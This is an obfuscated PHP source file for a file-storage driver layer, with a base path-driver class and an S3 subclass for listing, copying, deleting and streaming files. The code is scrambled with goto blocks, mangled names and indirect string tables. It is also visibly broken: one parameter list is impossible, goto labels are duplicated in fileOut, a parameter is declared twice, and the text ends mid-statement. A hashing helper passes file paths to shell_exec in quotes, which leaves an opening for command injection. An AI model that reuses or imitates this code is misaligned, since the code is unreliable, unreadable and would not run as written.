<?php
 goto fआ; fޤ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $Aϧ =& $_SERVER[Ť]; $this->objectDriver = array($Aϧ[57], $Aϧ[58], $Aϧ[59], $Aϧ[60], $Aϧ[61], $Aϧ[62], $Aϧ[63], $Aϧ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bᛉ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bᛉ, $_SERVER[Ť][8]); } return $bᛉ; } public function iconvApp($Dְ) { return $Dְ; } public function iconvSystem($Bֆ) { return $Bֆ; } public function iconvTo($B̖, $d潾֝ۿ, $D) { goto bÑ; e͗: return $Eԛ; goto eߣ; Eǌ: $Dԕ = $d潾֝ۿ . $F[66] . $D . $F[67] . $B̖; if (isset($E܄ܔ[$Dԕ])) { return $E܄ܔ[$Dԕ]; } if (function_exists($F[68])) { $Eԛ = @mb_convert_encoding($B̖, $D, $d潾֝ۿ); } else { $Eԛ = @iconv($d潾֝ۿ, $D, $B̖); } goto fřČ; C򛬈: $E܄ܔ[$D . $F[66] . $d潾֝ۿ . $F[67] . $B̖] = $B̖; $E܄ܔ[$D . $F[66] . $d潾֝ۿ . $F[67] . $Eԛ] = $B̖; $E܄ܔ[$d潾֝ۿ . $F[66] . $D . $F[67] . $Eԛ] = $Eԛ; goto e͗; bÑ: $F =& $_SERVER[Ť]; if (!$B̖ || !function_exists($F[65])) { return $B̖; } static $E܄ܔ = array(); goto Eǌ; fřČ: $Eԛ = $Eԛ ? $Eԛ : $B̖; if (strstr($Eԛ, $F[69])) { $Eԛ = str_replace($F[69], $F[70], $Eԛ); } $E܄ܔ[$d潾֝ۿ . $F[66] . $D . $F[67] . $B̖] = $Eԛ; goto C򛬈; eߣ: } public function getPathInner($aߦɋ) { $AЧ = IO::init($aߦɋ); return $AЧ->path; } public function getPathOuter($D낕) { $dݖ =& $_SERVER[Ť]; $AŃ = strlen(trim($this->pathBase, $dݖ[8])); $D낕 = substr(trim($D낕, $dݖ[8]), $AŃ); return $this->pathDriver . $dݖ[8] . ltrim($D낕, $dݖ[8]); } public function isParentOf($EΡ, $B͒) { $fڶ =& $_SERVER[Ť]; $EΡ = rtrim(strtolower($EΡ), $fڶ[8]) . $fڶ[8]; $B͒ = rtrim(strtolower($B͒), $fڶ[8]) . $fڶ[8]; $a = strpos($B͒, $EΡ) === 0; return $a; } public function getType() { $a =& $_SERVER[Ť]; $C۩ = str_replace($a[71], $a[33], get_class($this)); return strtolower($C۩); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($C꿆, $d) { $A󥛴ş =& $_SERVER[Ť]; $dޥ = rtrim($C꿆, $A󥛴ş[8]) . $A󥛴ş[8] . $d; $d = $this->exist($dޥ); return $d ? $dޥ : !1; } public function setModifyTime($C, $e݊Ǖ޻ = '') { } public function renameObject($CȪϊ, $A) { goto C; dȊ: $CȪϊ = $this->getPathOuter($CȪϊ); $A = $this->pathFather($CȪϊ) . $A; if (IO::isFile($CȪϊ)) { $EԬ = IO::copy($CȪϊ, $this->pathFather($CȪϊ), REPEAT_RENAME_FOLDER, $C); if ($EԬ) { IO::remove($CȪϊ); } } else { $EԬ = IO::mkdir($A); if (!$EԬ) { return !1; } $cłܸ = IO::listPath($CȪϊ, !0); $cҊͅ = array_merge($cłܸ[$B[73]], $cłܸ[$B[74]]); foreach ($cҊͅ as $a) { IO::move($a[$B[75]], $A, REPEAT_RENAME_FOLDER); } IO::remove($CȪϊ); } goto e̢; C: $B =& $_SERVER[Ť]; $C = $A; Hook::trigger($B[72], $this, $CȪϊ, $this, $this->pathFather($CȪϊ) . $A); goto dȊ; e̢: return $EԬ ? $A : !1; goto B; B: } public function tempFile($eǻ = '', $DƑǅ = '') { goto e䍾; e䍾: if (!$eǻ) { $eǻ = rand_string(15); } $f = TEMP_FILES . rand_string(15) . $_SERVER[Ť][8]; @mkdir($f, 511, !0); goto DĘ; B֭: return $DʫҢ; goto Bʐ瑑; DĘ: $DʫҢ = $f . $eǻ; @touch($DʫҢ); if ($DƑǅ) { file_put_contents($DʫҢ, $DƑǅ); } goto B֭; Bʐ瑑: } public function tempFileRemve($e俋) { @unlink($e俋); @rmdir($this->pathFather($e俋)); } public function mkfile($e, $b = '', $E˃ = REPEAT_RENAME) { } public function mkdir($e, $D錥 = REPEAT_SKIP) { } public function delFile($A) { } public function delFolder($D) { } public function copyFile($dܺۊ, $Cƪ) { } public function moveFile($Ȧ, $B) { } public function remove($b) { if ($this->isFile($b)) { return $this->delFile($b); } return $this->delFolder($b); } public function rename($cڶֱ, $b) { } public function exist($E) { } public function findByHash($Dׄ = '', $B겿 = '') { return !1; } public function isFile($e) { } public function isFolder($Dڲ) { } public function size($d) { } public function info($C迫♠) { } public function infoSimple($Cń) { return $this->info($Cń); } public function infoAuth($D) { return $this->info($D); } public function infoFull($bΉ) { return $this->info($bΉ); } public function infoWithChildren($Fɕֹ) { $b =& $_SERVER[Ť]; static $d = array(); if (isset($d[$Fɕֹ])) { return $d[$Fɕֹ]; } $B = $this->info($Fɕֹ); if ($B && $B[$b[29]] == $b[76]) { $d = array($b[77] => 0, $b[78] => 0, $b[79] => 0); $this->infoChildren($Fɕֹ, $d); $B[$b[77]] = $d[$b[77]]; $B[$b[80]] = array($b[81] => $d[$b[78]], $b[82] => $d[$b[79]]); $d[$Fɕֹ] = $B; } return $B; } public function listPath($Dྨ, $cɱ = false) { } public function has($e, $b郧 = false, $bȶà = false) { } public function canRead($E͚ȉ) { } public function canWrite($f) { } public function getContent($f) { } public function setContent($C֭͜, $a㹼 = '') { } protected function infoChildren($c, &$ḃ) { $e =& $_SERVER[Ť]; check_abort_echo(); $Cі = $this->listPath($c, !0); $Cі = array_merge($Cі[$e[74]], $Cі[$e[73]]); foreach ($Cі as $b) { if ($b[$e[29]] == $e[76]) { $ḃ[$e[79]]++; $D = $this->getPathInner($b[$e[75]]); $this->infoChildren($D, $ḃ); } else { $ḃ[$e[78]]++; $ḃ[$e[77]] += $b[$e[77]]; } } } public function fileSubstr($FՂ, $B, $FӐ) { } public function listAll($c;䘼) { } public function upload($f̼Ҋ, $DΟم, $bڏ = false, $Eˠ = REPEAT_REPLACE) { } public function uploadFileByID($cվ, $EጅĢ, $Cﴚ) { } public function uploadFileByPath($c𣟤, $dߝ, $cŇ = array()) { } public function isUploadServer() { $D =& $_SERVER[Ť]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $D[83]) { return !0; } return $GLOBALS[$D[6]][$D[84]][$D[85]]; } public function isFileOutServer() { $eԷ =& $_SERVER[Ť]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $eԷ[83]) { return !0; } return $GLOBALS[$eԷ[6]][$eԷ[84]][$eԷ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($B̗̂) { $CږҊ =& $_SERVER[Ť]; if (!$this->isCdnHost()) { return $B̗̂; } return str_replace(trim(get_url_root($B̗̂), $CږҊ[8]), trim($this->cdnHost, $CږҊ[8]), $B̗̂); } public function uploadLink($Bɋ, $dȵ܋ = 0) { goto aݨ; D: if (!in_array($eĝ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $eя = 1024 * 1024 * 10; goto Eῗ; B٬: if ($a׌) { $a׌[$a⑌[89]] = $Bɋ; $a׌[$a⑌[90]] = $eĝ; } return $a׌; goto A۸; Eῗ: $Dެ = $dȵ܋ <= $eя ? $a⑌[87] : $a⑌[88]; $dǋۄ = (!$dȵ܋ ? 1 : ceil($dȵ܋ / pow(1024, 3))) * 3600 * 4; $a׌ = $this->{$Dެ}($Bɋ, $dǋۄ); goto B٬; aݨ: $a⑌ =& $_SERVER[Ť]; if ($this->isUploadServer()) { return; } $eĝ = $this->getType(); goto D; A۸: } public function uploadFormData($Fƛ, $D췙 = 3600) { } public function multiUploadFormData($Bˊ, $BВ = 3600) { } public function download($EɃ, $C) { } public function ext($C) { $dϋ =& $_SERVER[Ť]; if (strpos($C, $dϋ[8]) === -1) { $D = $C; } else { $D = $this->pathThis($C); } $cܾ = $dϋ[33]; if (strstr($D, $dϋ[91])) { $cܾ = substr($D, strrpos($D, $dϋ[91]) + 1); $cܾ = strtolower($cܾ); } if (strlen($cܾ) > 3 && preg_match($dϋ[92], $cܾ, $cź)) { $cܾ = $dϋ[33]; } return $cܾ; } public function pathThis($F) { $F̮ =& $_SERVER[Ť]; $F = str_replace($F̮[93], $F̮[8], rtrim($F, $F̮[8])); $dߜ = strrpos($F, $F̮[8]); if ($dߜ === !1) { return $F; } return substr($F, $dߜ + 1); } public function pathFather($C₥) { $B =& $_SERVER[Ť]; $C₥ = str_replace($B[93], $B[8], rtrim($C₥, $B[8])); $E = strrpos($C₥, $B[8]); if ($E === !1) { return $B[33]; } return substr($C₥, 0, $E + 1); } public function hashSimple($fȳ) { goto aϛԬ; Fӝ: $A鴄 .= $this->fileSubstr($fȳ, $B譠 - $Aᗪ, $Aᗪ); return md5($A鴄) . $B譠; goto b靯; aϛԬ: $d뢙 =& $_SERVER[Ť]; if (!$fȳ) { return md5($d뢙[33]); } $B譠 = $this->size($fȳ); goto Bû; Bû: $Aᗪ = 200; $C΋ = 50; if ($B譠 <= $Aᗪ * $C΋) { return $this->hashMd5($fȳ) . $B譠; } goto E; E: $a = intval($B譠 / $C΋); $A鴄 = $d뢙[33]; for ($F䔦Ĩ = 0; $F䔦Ĩ < $C΋; $F䔦Ĩ++) { $A鴄 .= $this->fileSubstr($fȳ, $a * $F䔦Ĩ, $Aᗪ); } goto Fӝ; b靯: } public static $md5Cache = array(); public function hashMd5($f򎥪) { $f򎥪 = $this->iconvSystem($f򎥪); if (isset(self::$md5Cache[$f򎥪])) { return self::$md5Cache[$f򎥪]; } self::$md5Cache[$f򎥪] = $this->hashMd5Shell($f򎥪); if (!self::$md5Cache[$f򎥪]) { self::$md5Cache[$f򎥪] = @md5_file($f򎥪); } return self::$md5Cache[$f򎥪]; } private function hashMd5Shell($Fʗʄ) { goto dȝШ; dȝШ: $Eń =& $_SERVER[Ť]; if (!function_exists($Eń[94])) { return !1; } $B׹ = array($Eń[95], $Eń[96]); goto a㦫; a㦫: $E = Cache::get($Eń[97]); if (!$E) { $Fυܷ = BASIC_PATH . $Eń[98]; $d˛ = md5_file($Fυܷ); $E = $Eń[99]; foreach ($B׹ as $d) { $aμ = shell_exec($d . "\x20\x22{$Fυܷ}\x22"); if ($aμ && substr(trim($aμ), 0, 32) == $d˛) { $E = $d; break; } } Cache::set($Eń[97], $E, 3600); } if ($E == $Eń[99]) { return !1; } goto cʈ; cʈ: $aμ = shell_exec($E . "\x20\42{$Fʗʄ}\42"); $aμ = str_replace($Eń[100], $Eń[33], $aμ); return substr($aμ, 0, 32); goto Dў; Dў: } public function link($C) { return $C; } public function fileOut($AŻވ, $D׹⏬ = false, $e = false, $Bԣ = '') { goto E; F䑞: if (in_array($EױǇ, array($d[108], $d[109], $d[110], $d[111]))) { $EױǇ = $d[112]; } if (!$Bԣ) { $Bԣ = md5($c . $this->hashSimple($AŻވ)); } $Bԣ = $d[113] . $Bԣ . $d[113]; goto c; fộ: $e = $d[113] . $e . $d[119] . $e; if ($D׹⏬) { header($d[120]); header($d[121] . $e); } else { header($d[122] . $e); } header($d[123] . gmdate($d[106], time() + 3600 * 24 * 30) . $d[124]); goto b; C炄: header($d[117]); header($d[118] . $A掛); $e = rawurlencode($cԳ); goto fộ; b: $E = $D[$d[77]]; $c = gmdate($d[106], $D[$d[107]]); $cԳ = $e ? $e : $this->iconvApp($D[$d[28]]); goto D; E: $d =& $_SERVER[Ť]; $this->cacheMethod(null, null); if (!$AŻވ || !$this->exist($AŻވ)) { show_json(LNG($d[101]), !1, $e); } goto e͍; B॰: $AՄ = strtolower($_SERVER[$d[139]]); if ($aڄ && $AՄ && $Cɽ) { if (strstr($AՄ, $d[140])) { header($d[141] . $AŻވ); } else { if (strstr($AՄ, $d[142])) { header($d[143] . $AŻވ); } else { if (strstr($AՄ, $d[144])) { header($d[145] . $AŻވ); } } } if ($e돇ۼ) { header($d[146] . $e돇ۼ); } return; } if (isset($_SERVER[$d[147]])) { if (preg_match($d[148], $_SERVER[$d[147]], $C͢)) { $c = intval($C͢[1]); if (!empty($C͢[2])) { $F = intval($C͢[2]); } } header($d[149]); header("\x43\157\156\x74\145\x6e\x74\x2d\122\141\156\147\145\72\x20\x62\171\x74\145\x73\x20{$c}\55{$F}\x2f" . $E); } else { header($d[150]); } goto dɗƑܯ; D: $c = 0; $F = $E - 1; $EױǇ = $this->ext($cԳ); goto F䑞; dɗƑܯ: $A㹽 = !0; if ($_SERVER[$d[151]] == $d[152] && $E > 1204 * 1024 * 1024 * 2) { $A㹽 = !1; } if ($A㹽) { header($d[153] . ($F - $c + 1)); } goto F׈; d: if ($e돇ۼ) { $E = intval(1000 * 1000 * ($D / $e돇ۼ)); } while ($c <= $F) { $E露 = timeFloat(); check_abort(); $a뿉إ = $F - $c + 1; if ($a뿉إ <= $D) { $D = $a뿉إ; } echo $this->fileSubstr($AŻވ, $c, $D); $c += $D; if ($D == $a뿉إ) { $c = $F + 1; } if ($E) { $d򣪶 = intval(1000 * 1000 * (timeFloat() - $E露)); $CƠ暄 = $E - $d򣪶; if ($CƠ暄 > 5) { usleep($CƠ暄); } } } goto dҝ; b: header($d[125]); header($d[126]); header($d[127]); goto d; d: if (isset($_SERVER[$d[128]]) && strtotime($_SERVER[$d[128]]) == $D[$d[107]]) { header($d[129], !0, 304); die; } if (isset($_SERVER[$d[130]]) && $_SERVER[$d[130]] == $Bԣ) { header($d[131] . $Bԣ, !0, 304); die; } header($d[131] . $Bԣ); goto A񌷅; F׈: if ($_SERVER[$d[154]] == $d[155]) { return; } $D = 1024 * 100; $E = 0; goto d; fڶ: header($d[135] . $E); header($d[136]); if (!$D׹⏬ && $EױǇ == $d[137]) { if ($E > 1024 * 1024 * 5) { die; } $Dɛ = $this->getContent($AŻވ); $Dɛ = Html::clearSVG($Dɛ); header($d[138] . strlen($Dɛ)); echo $Dɛ; die; } goto B॰; e͍: $aڄ = $this->getType() == $d[102]; $Cɽ = $GLOBALS[$d[6]][$d[84]][$d[103]][$d[104]]; $e돇ۼ = (double) $GLOBALS[$d[6]][$d[84]][$d[103]][$d[105]] * 1024 * 1024; goto D߃ʈ; c: $A掛 = get_file_mime($EױǇ); if (strstr($A掛, $d[114])) { $A掛 = $A掛 . $d[115]; } if ($D׹⏬ === !1 && !mime_support($A掛)) { $D׹⏬ = !0; $A掛 = $d[116]; } goto C炄; A񌷅: header($d[132] . $c . $d[124]); header($d[133] . $cԳ); header($d[134]); goto fڶ; D߃ʈ: @ob_end_clean(); set_timeout(); $D = $this->infoFull($AŻވ); goto b; dҝ: } public function fileOutServer($d, $bط = false, $EلŽ = false, $eƧ = '') { $this->fileOut($d, $bط, $EلŽ, $eƧ); } public function fileOutLink($aʂ) { header($_SERVER[Ť][156] . $aʂ); die; } public function cacheMethod($F, $fר, $Bگ = null) { goto aĄʅ; A: $fӋ = $Bƥ˨®[157] . $F . $Bƥ˨®[158] . rtrim($bߍ, $Bƥ˨®[8]); if (is_null($F)) { $EŊ = array(); return; } if (is_null($fר)) { unset($EŊ[$fӋ]); return; } goto b; b: if (!is_null($Bگ)) { $EŊ[$fӋ] = $Bگ; return; } $Bᑟ = isset($EŊ[$fӋ]) ? $EŊ[$fӋ] : null; if (!is_null($Bᑟ)) { return $Bᑟ; } goto dҾ; aĄʅ: $Bƥ˨® =& $_SERVER[Ť]; static $EŊ = array(); $bߍ = $fר ? ltrim($this->getPathOuter($fר), $Bƥ˨®[8]) : $fר; goto A; dҾ: $Bᑟ = $this->{$F}($fר); $EŊ[$fӋ] = $Bᑟ; return $Bᑟ; goto Dꆅ; Dꆅ: } public function fileOutImage($eϳ, $eКލ = 250) { goto C; eΏț: if ($að[$aݟ[77]] <= 1024 * 50 || $cѤ || !function_exists($aݟ[164]) || $að[$aݟ[165]] == $aݟ[166]) { return $this->fileOut($eϳ, !1, $aʍ); } if (isset($að[$aݟ[161]][$aݟ[167]])) { $dĉ = $að[$aݟ[161]][$aݟ[167]]; } else { if (isset($að[$aݟ[161]][$aݟ[168]])) { $dĉ = $að[$aݟ[161]][$aݟ[168]]; } else { $dĉ = md5("{$að[$aݟ[28]]}\x5f{$að[$aݟ[75]]}\137{$að[$aݟ[77]]}"); } } $EŇÏ = "{$dĉ}\x5f{$eКލ}\56\x70\156\x67"; goto Dф; d: if (!file_exists($c) || filesize($c) < 100) { return @file_exists($D) ? IO::fileOut($D) : $this->fileOut($eϳ); } if (!($f = IO::move($c, $Cř))) { return IO::fileOut($c); } del_file($c); goto cԇ˧; C: $aݟ =& $_SERVER[Ť]; if (substr($eϳ, 0, 4) == $aݟ[144]) { $this->fileOutLink($eϳ); } $að = $this->info($eϳ); goto e¥䤎; Bįѽ: $c = DATA_THUMB . $EŇÏ; del_file($c); if (!@file_exists($c)) { $f = TEMP_FILES; if (!is_dir($f)) { mk_dir($f); } $D = $f . $dĉ . $aݟ[91] . $að[$aݟ[165]]; if (!@file_exists($D)) { $D = $this->download($eϳ, $D); } $c׹ = new ImageThumb($D, $aݟ[171]); $c׹->prorate($c, $eКލ, $eКލ * 10); } goto d; cԇ˧: IO::fileOut($f); goto Bԣ׌; Dф: if (!($cͱƮ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $aݟ[169]))) { $Cř = IO::mkdir(IO_PATH_SYSTEM_TEMP . $aݟ[170]); } else { $Cř = KodIO::make($cͱƮ); } if ($cͱƮ = IO::fileNameExist($Cř, $EŇÏ)) { $c = KodIO::make($cͱƮ); return IO::fileOut($c, !1, $aʍ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Bįѽ; e¥䤎: $aʍ = $að[$aݟ[28]]; $cѤ = !1; if (isset($GLOBALS[$aݟ[159]]) && $GLOBALS[$aݟ[159]][$aݟ[75]] == $að[$aݟ[75]]) { $C = $GLOBALS[$aݟ[159]][$aݟ[160]]; if (!$að[$aݟ[161]]) { $að[$aݟ[161]] = $GLOBALS[$aݟ[159]]; } if (isset($C[$aݟ[162]])) { if ($C[$aݟ[162]] <= $eКލ && $C[$aݟ[163]] <= $eКލ) { $cѤ = !0; } } $aʍ = $að[$aݟ[161]][$aݟ[28]]; } goto eΏț; Bԣ׌: } public function fileOutImageServer($E, $cӑά = 250) { $this->fileOutImage($E, $cӑά); } public function fileNameAuto($c, $D, $F̙ = REPEAT_RENAME, $bʅ = false) { goto Cڐ; c: if ($F̙ == REPEAT_SKIP) { return !1; } $a = $c[91] . get_path_ext($D); $a = $a == $c[91] || $bʅ ? $c[33] : $a; goto Fד; Fד: $Dର = 1; $C챬 = substr($D, 0, strlen($D) - strlen($a)); $D٨ = $C챬 . "\x28{$Dର}\x29{$a}"; goto Fۗ; Fۗ: while ($this->exist(rtrim($c, $c[8]) . $c[8] . $D٨)) { $D٨ = $C챬 . "\x28{$Dର}\x29{$a}"; $Dର++; } return $D٨; goto eƧ; Cڐ: $c =& $_SERVER[Ť]; $aڼ = $c === $c[33] ? $D : rtrim($c, $c[8]) . $c[8] . $D; if ($F̙ == REPEAT_REPLACE || !$this->exist($aڼ) || $bʅ && $F̙ != REPEAT_RENAME_FOLDER) { return $D; } goto c; eƧ: } public function listAllFiles($B, $A͞Ȃ, $Cβ䞿 = array()) { goto f; d߃: $B = trim($B, $Eĵй[8]); foreach ($A͞Ȃ as $D匡) { $eɨϰ = ltrim(substr(trim($D匡, $Eĵй[8]), strlen($B)), $Eĵй[8]); $a皰 = array_merge($a皰, $this->slicePath($eɨϰ)); } $F = array(); goto Eߏ; f: $Eĵй =& $_SERVER[Ť]; if (empty($A͞Ȃ)) { return array(); } $a皰 = array(); goto d߃; Eߏ: foreach (array_unique($a皰) as $D匡) { $D = array($Eĵй[75] => $this->getPathOuter($Eĵй[8] . $B . $Eĵй[8] . $D匡), $Eĵй[76] => 1, $Eĵй[77] => 0); if (substr($D匡, -1) != $Eĵй[8]) { $D[$Eĵй[76]] = 0; $Fٻ = $this->getPath($B . $Eĵй[8] . $D匡); $D[$Eĵй[77]] = isset($Cβ䞿[$Fٻ]) ? $Cβ䞿[$Fٻ] : $this->size($Fٻ); } $F[] = $D; } return $F; goto E؆¨; E؆¨: } public function slicePath($bϗ) { $EӔ =& $_SERVER[Ť]; $E = explode($EӔ[8], trim($bϗ, $EӔ[8])); $a = 0; do { ++$a; $DϤսҏ[] = implode($EӔ[8], array_slice($E, 0, $a)) . $EӔ[8]; } while ($a < count($E)); $DϤսҏ[count($E) - 1] = $bϗ; return $DϤսҏ; } public function getHost() { $Fᷯ =& $_SERVER[Ť]; $EЧ = parse_url(trim($this->domain, $Fᷯ[8])); $DӨ = isset($EЧ[$Fᷯ[172]]) ? $EЧ[$Fᷯ[172]] : http_type(); $F = isset($EЧ[$Fᷯ[173]]) ? $EЧ[$Fᷯ[173]] : $EЧ[$Fᷯ[75]]; if (isset($EЧ[$Fᷯ[174]])) { $F .= $Fᷯ[4] . $EЧ[$Fᷯ[174]]; } return $DӨ . $Fᷯ[175] . $F; } public function pathEncode($E) { $eӇ =& $_SERVER[Ť]; return str_replace($eӇ[176], $eӇ[8], rawurlencode($E)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($cѼ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ť][177]; parent::__construct(); $this->_init($cѼ); } public function _init($dϧ) { foreach ($dϧ as $F => $B) { if (isset($this->{$F})) { $this->{$F} = $B; } } $this->endpoint = $dϧ[$_SERVER[Ť][178]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($E = "\166\64") { $this->signVer = $E; $this->client->setSignatureVersion($E); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto F; f: $dķ = array($c錘Ơ[184], $c錘Ơ[185], $c錘Ơ[186], $c錘Ơ[187], $c錘Ơ[188]); $c = array_diff($dķ, $F稧); return empty($c); goto fґ; Fዣ: if ($a궑[$c錘Ơ[179]] != $c錘Ơ[180] || $a궑[$c錘Ơ[181]] != $c錘Ơ[180]) { return !1; } $F稧 = array_map($c錘Ơ[182], $a궑[$c錘Ơ[183]]); if (!is_array($F稧)) { $F稧 = array(); } goto f; F: $c錘Ơ =& $_SERVER[Ť]; $a궑 = $this->getBucketCors(); if (!$a궑 || !is_array($a궑)) { return !1; } goto Fዣ; fґ: } public function mkfile($e녛, $Fʮ = '', $E = REPEAT_RENAME) { $A° = $this->setContent($e녛, $Fʮ); if ($A° !== !1) { return $this->getPathOuter($e녛); } return !1; } public function mkdir($fԴ, $bŏ = REPEAT_SKIP) { if (empty($fԴ)) { return !1; } if ($this->_isFolder($fԴ)) { return $this->getPathOuter($fԴ); } $a = $this->setContent($fԴ, $_SERVER[Ť][33], !0); if ($a !== !1) { return $this->getPathOuter($fԴ); } return !1; } public function copyFile($fԚ, $c܅, $c = array()) { $B =& $_SERVER[Ť]; $EóҠ = $this->objectMeta($fԚ); if (!$EóҠ) { return !1; } if ($EóҠ[$B[77]] <= 1024 * 1024 * 200) { $A = $this->client->copyObject($this->bucket, $fԚ, $this->bucket, $c܅, $B[189], $c); } else { $A = $this->client->multiCopyObject($this->bucket, $fԚ, $this->bucket, $c܅, $c); } $A = $A ? $this->getPathOuter($c܅) : !1; return $A; } public function moveFile($F, $bܯ) { if ($this->copyFile($F, $bܯ)) { $this->delFile($F); return $this->getPathOuter($bܯ); } return !1; } public function delFile($A) { return $this->client->deleteObject($this->bucket, $A); } public function delFolder($cؔ) { goto C; c: $aԯ = $this->fileList($cؔ); $this->listItemCache = !0; $AҘ = trim($cؔ, $Cδ[8]) . $Cδ[8]; goto D羏⭽; D羏⭽: if (!empty($cؔ) && !in_array($AҘ, $aԯ[$Cδ[74]])) { $aԯ[$Cδ[74]][] = $AҘ; } $aڗ = $this->delByBatch($aԯ[$Cδ[73]]); if (!$aڗ) { return !1; } goto cխӤ; C: $Cδ =& $_SERVER[Ť]; if (!$this->exist($cؔ)) { return !0; } $this->listItemCache = !1; goto c; cխӤ: return $this->delByBatch($aԯ[$Cδ[74]]); goto FɄ; FɄ: } private function delByBatch($bأř) { foreach (array_chunk($bأř, 1000) as $fܕ) { $b = $this->client->deleteObjects($this->bucket, $fܕ); if (!$b) { return !1; } } return !0; } public function rename($B, $c؞ь) { return $this->renameObject($B, $c؞ь); } public function listPath($Dׄ, $E܂ = false) { $eԋϹϩ =& $_SERVER[Ť]; $Eߐ¸ = $this->fileList($Dׄ, $eԋϹϩ[8], !0); foreach ($Eߐ¸[$eԋϹϩ[74]] as $b㋇ => $C) { $Eߐ¸[$eԋϹϩ[74]][$b㋇] = $this->folderInfo($C, $E܂); } foreach ($Eߐ¸[$eԋϹϩ[73]] as $b㋇ => $C) { $Eߐ¸[$eԋϹϩ[73]][$b㋇] = $this->fileInfo($C[$eԋϹϩ[28]], $E܂, $C); } return $Eߐ¸; } private function fileInfo($a揠, $A۫ʻ = false, $Eڃƻ = array()) { goto cፆ; e: if (isset($Eڃƻ[$C囋[193]])) { $F[$C囋[107]] = $Eڃƻ[$C囋[193]]; } if (isset($Eڃƻ[$C囋[77]])) { $F[$C囋[77]] = $Eڃƻ[$C囋[77]]; } return $F; goto cדԳ; cፆ: $C囋 =& $_SERVER[Ť]; $F = array($C囋[28] => $this->pathThis($a揠), $C囋[75] => $this->getPathOuter($a揠), $C囋[29] => $C囋[171], $C囋[165] => $this->ext($a揠), $C囋[77] => isset($Eڃƻ[$C囋[77]]) ? $Eڃƻ[$C囋[77]] : 0); if ($A۫ʻ) { return $F; } goto b; b: $F[$C囋[190]] = $F[$C囋[107]] = 0; $F[$C囋[191]] = $F[$C囋[192]] = !0; if (empty($Eڃƻ)) { $Eڃƻ = $this->objectMeta($a揠); if (!$Eڃƻ) { return $F; } } goto e; cדԳ: } private function folderInfo($a, $b֍ = false) { goto fĊ; B֝: $f[$b惜[190]] = $f[$b惜[107]] = 0; $f[$b惜[191]] = $f[$b惜[192]] = !0; if ($a == $b惜[33]) { return $f; } goto Cё; DךĜ: return $f; goto bÛ; Cё: $a = trim($a, $b惜[8]) . $b惜[8]; $c۫ = $this->objectMeta($a); if (isset($c۫[$b惜[193]])) { $f[$b惜[190]] = $c۫[$b惜[193]]; } goto DךĜ; fĊ: $b惜 =& $_SERVER[Ť]; $f = array($b惜[28] => $this->pathThis($a), $b惜[75] => $this->getPathOuter($b惜[8] . $a), $b惜[29] => $b惜[76]); if ($b֍) { return $f; } goto B֝; bÛ: } private function fileList($a˚, $a͛ = '', $F⍈ = 0) { goto e; aƊ: if (!$Bţܵ) { return array($fŃ[74] => array(), $fŃ[73] => array()); } $a = $this->listItemCache === !1 ? !1 : !0; $B㥹 = $E = array(); goto d盖ܪ; e: $fŃ =& $_SERVER[Ť]; $BҰ = rtrim($a˚, $fŃ[8]) . $fŃ[8]; $Bţܵ = $this->listObjs($BҰ, null, null, $a͛); goto aƊ; d盖ܪ: foreach ($Bţܵ[$fŃ[194]] as $F) { goto dޑ; C: $E[] = $F⍈ ? $F : $Dʾ; goto Bǭ; c꟧: $D򉈱 = $dĝ == 0 && substr($Dʾ, strlen($Dʾ) - 1, 1) == $fŃ[8] ? !0 : !1; if ($a) { $this->cacheMethod($fŃ[195], $Dʾ, $D򉈱); $this->cacheMethod($fŃ[196], $Dʾ, $F); } if ($D򉈱) { $B㥹[] = $Dʾ; continue; } goto C; dޑ: $Dʾ = $F[$fŃ[28]]; if ($Dʾ == $BҰ) { continue; } $dĝ = isset($F[$fŃ[77]]) ? $F[$fŃ[77]] : 0; goto c꟧; Bǭ: } foreach ($Bţܵ[$fŃ[197]] as $F) { $B㥹[] = $F[$fŃ[28]]; if ($a) { $this->cacheMethod($fŃ[195], $F[$fŃ[28]], !0); } } if ($a) { $this->cacheMethod($fŃ[195], $a˚, !0); } goto eҹ; eҹ: return array($fŃ[74] => $B㥹, $fŃ[73] => $E); goto a; a: } private function listObjs($d, $d܌ى = null, $Cޓ = null, $Cܓ㊬ = null) { $B =& $_SERVER[Ť]; $d = trim($d, $B[8]); $A醦 = empty($d) ? $B[33] : $d . $B[8]; return $this->client->getBucket($this->bucket, $A醦, $d܌ى, $Cޓ, $Cܓ㊬, !0); } public function has($d, $DŔ = false, $d = true) { goto C; C: $bӛ =& $_SERVER[Ť]; $d = trim($d, $bӛ[8]); $eؐ = empty($d) ? $bӛ[33] : $d . $bӛ[8]; goto e; Eڲ: $D = $e = array(); while (!0) { $a̚ = $this->listObjs($d, $bׯ󼠫, $c˛Т, $c͇); if (!$a̚) { break; } $bׯ󼠫 = $a̚[$bӛ[198]]; $E¨ = $a̚[$bӛ[194]]; $C؏ = $a̚[$bӛ[197]]; if (empty($E¨) && empty($C؏)) { break; } if (count($E¨) == 1 && $E¨[0][$bӛ[28]] == $eؐ) { break; } if ($DŔ) { if (count($E¨)) { $E¨ = array_column($E¨, $bӛ[28]); $D = array_merge($D, $E¨); } if (count($C؏)) { $C؏ = array_column($C؏, $bӛ[28]); $e = array_merge($e, $C؏); } if ($bׯ󼠫 === null) { break; } continue; } if ($d) { if (!empty($E¨)) { if (count($E¨) > 1 || isset($E¨[0][$bӛ[28]]) 